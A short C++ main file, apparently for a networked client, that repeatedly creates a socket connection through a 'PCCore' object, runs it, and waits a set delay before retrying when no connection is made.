#include "pccore.h"
#include <iostream>
#include <unistd.h>
#include "defines.h"

int main()
{
    int result = 0;
    LOOP_LINE
    {
        PCCore core;
        bool success = core.socketCreated();
        if (success)
        {
            std::cout << "Connected!" << std::endl;
            result = core.run();
            core.cleanSockets();
        }
        ON_NO_SOCKET
        {
            std::cout << "Next connection attempt will be in " << RETRY_DELAY << " seconds" << std::endl;
            sleep(RETRY_DELAY);
        }
    }

    return result;
}


